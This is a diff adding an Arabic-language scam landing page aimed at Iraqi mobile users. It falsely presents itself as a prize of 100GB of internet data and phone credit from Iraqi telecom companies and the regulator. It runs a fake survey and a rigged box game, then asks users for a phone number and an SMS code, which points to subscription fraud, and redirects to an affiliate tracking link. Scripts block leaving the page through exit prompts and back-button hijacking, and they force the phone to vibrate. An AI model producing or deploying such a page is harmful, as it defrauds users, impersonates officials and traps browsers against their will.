@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<title>B.LABAN 2024</title>
+	<link rel="canonical" href="https://blabaneg.pages.dev" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="survey-pick-a-box">
+<meta name="description" content="survey-pick-a-box">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+<link href="css/app.css" type="text/css" rel="stylesheet" />
+<link href="css/landers/survey-pick-a-box/app.css" type="text/css" rel="stylesheet" />
+<meta name="robots" content="noindex,nofollow">
+<script defer data-domain="blaban" src="js/script.js"></script>
+</head>
+<body>
+<div>
+  <img src='https://i.ibb.co/VSj079y/fa25b11d-667d-495e-b0ef-f21de25cb7a3.jpg' width='120px' height="120px"/>
+</div>
+<div class="app" id="app" v-cloak>
+<vue-modal v-show="!showRotator && !showPrize" :open="showOpeningModal" class="opening-modal">
+<img class="opening-modal__image" src="https://i.ibb.co/VSj079y/fa25b11d-667d-495e-b0ef-f21de25cb7a3.jpg" style="width: 130px;height: 130px;" alt="Apple iPhone 13 Pro Max" />
+<h1 class="heading heading--h1">
+!! تهانينا لك
+</h1>
+<p class="paragraph">
+  هدية المقـدمة من شـركات الاتصالات العراقية بتعاون مع الهيئة العامة لتنظيم قطاع الاتصالات تقدم لك 100 جيجا انترنت + 15000الف دينار هدية رصيد</p>
+<p class="paragraph">
+اضغط "موافق" للحصول على جائزتك
+</p>
+<button class="button" v-on:click="showOpeningModal = false; $confetti.stop()">
+موافق
+</button>
+</vue-modal>
+<vue-modal :open="showInstructionsModal">
+<img src="N49BUCH.png" style="width: 80px;">
+<h2 class="heading heading--h1">تم حفظ إجاباتك بنجاح</h2>
+<p class="paragraph">
+الان لديك فرصه للفوز ب100 جيجا انترنت + 15000الف دينار هدية رصيد<br><br>
+✅سجل رقم هاتفك لنتمكن من التواصل معك<br><br>
+✅ستحصل على رمز رسالة تحتوي على الرقم اكتبه في المستمدة وأضغط نعم</p>
+<button class="button" onclick="go()">
+استمرار
+</button>
+</vue-modal>
+<vue-modal :open="showFailModal">
+<h1 class="heading heading--h1">حظ أوفر في المرة القادمة</h1>
+<p class="paragraph">
+.لديك (2) فرص اضافية
+</p>
+<button class="button" v-on:click="showFailModal = false">
+موافق
+</button>
+</vue-modal>
+<vue-modal :open="showSuccessModal">
+<img src="UarHZhk.png" style="width: 300px;">
+<h1 class="heading heading--h1">!!تهانينا لك</h1>
+<p class="paragraph">
+انت الرابح معنا بجائزة <br><br> ٣ القنبلة + ٣ أزر بـ لبن + ٤ قشطوطة + ٣ كشري + ٤ ام علي <br><br>اتبع التعليمات التالية للحصول على جائزتك
+</p>
+<button class="button" onclick="go();">
+استمرار
+</button>
+</vue-modal>
+<div class="left" style="display: none;">
+<div class="product-preview">
+<div class="product-preview__title">
+</div>
+</div>
+</div>
+<div class="right">
+<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="img/landers/survey-pick-a-box/lid.png" box-image="img/landers/survey-pick-a-box/box.png" box-back-image="img/landers/survey-pick-a-box/box-back.png" prize-image="img/prizes/iphone-13-pro-max/default@0.75x.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+<div class="verify" v-if="showRotator">
+<vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
+                     "... الرجاء الإنتظار قليلاً",
+              "... الرجاء الإنتظار قليلاً",
+              "... الرجاء الإنتظار قليلاً"
+            ]'>
+</vue-text-rotator>
+<div class="verify__text" v-if="rotateIndex > 1">
+<strong>
+لقد قمت بالرد على جميع الأسئلة
+</strong>
+<img class="verify__icon verify__icon--checked" src="img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+جاري معالجة إجاباتك
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 2">
+<strong>
+!لا تزال هناك جوائز متاحة
+</strong>
+<img class="verify__icon verify__icon--checked" src="img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+جاري البحث عن الجوائز
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 3">
+<strong>
+!تبقي 1294 جائزة فقط 
+</strong>
+<img class="verify__icon verify__icon--checked" src="img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+جاري فحص المخزون
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+</div>
+<vue-survey style="
+border-radius: 20px;
+border: 1px solid black;
+box-shadow: 7px 7px 20px #502323;
+" v-if="showSurvey" :show-steps="true" :questions='[
+            {
+              title: "ما هو جنسك ؟",
+              answers: [ { text: "ذكر" }, { text: "آنثى" } ]
+            },
+            {
+              title: "ما هو عمرك ؟",
+              answers: [ { text: "اقل من 18" }, { text: "18-29" }, { text: "30-39" }, { text: "40-49" }, { text: "50+" } ]
+            },
+            {
+              title: "هل سبق لك  ربح 100 جيجا انترنت  ؟",
+              answers: [ { text: "نعم" }, { text: "لا" } ]
+            },
+            {
+              title: "ما اسم شركه الاتصالات ؟",
+              answers: [ { text: " زين العراق (Zain Iraq)" }, { text: "أسيا سيل (AsiaCell)" }, { text: "كورك تليكوم (Korek Telecom)" }, { text: "ريان (Rewan) " }, { text: " الشركة العامة للاتصالات والبريد" } ]
+            },
+            {
+              title: " المحافظه التى تقيم بها ؟",
+              answers: [ { text: "محافظة بغداد" }, { text: "محافظة البصرة" }, { text: "محافظة نينوى" }, { text: "غير ذلك" } ]
+            },
+            {
+              title: "هل سبق وشاركت معنا من قبل ؟",
+              answers: [ { text: "نعم" }, { text: "لا" } ]
+            },
+          ]' v-on:finish="onSurveyFinish"></vue-survey>
+</div>
+</div>
+<img src='https://abcnewsiq.com/wp-content/uploads/2023/05/%D9%88%D8%B2%D8%A7%D8%B1%D8%A9-%D8%A7%D9%84%D8%A7%D8%AA%D8%B5%D8%A7%D9%84%D8%A7%D8%AA-%D8%A7%D9%84%D8%B9%D8%B1%D8%A7%D9%82%D9%8A%D8%A9-e1602849726669-573x330.png' width='75%'/>
+<script>window.view = window.view || {};view.offerUrl = "https:\/\/rdr.funcontent.xyz/click";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script> <script src="js/app.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
+<script src="js/landers/survey-pick-a-box/app.js" type="application/javascript"></script>
+<script>
+function go() {
+    window.onbeforeunload = null;
+    window.location.href = 'https://goearn.ayznoo.online/?utm_medium=52594eb1a596cbdd097a28aea9161c4db0200eac&utm_campaign=Iraq&cid=78575';
+}
+</script>
+<script>
+var PreventExitPop = true;
+function ExitPop() {
+    if (PreventExitPop != false) {
+        return "Don't miss out!";
+    }
+}
+window.onbeforeunload = ExitPop;
+</script>
+<script>
+    ! function() {
+    var t;
+    try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
+        onpopstate = function(event) {
+            event.state && true
+        }
+    } catch (o) {
+        console.log(o);
+    }
+}();
+</script>
+<script>
+	navigator.vibrate([1000, 300, 1000, 300,1000]);
+</script>
+<script src="p.js" defer></script>
+<noscript><img src="l3NimxL.png" width="1" height="1" /></noscript>
+</html>
+<!-- JS GOOGLE -->
+<!-- Global site tag (gtagش.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-152330835-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-152330835-1');
+</script>
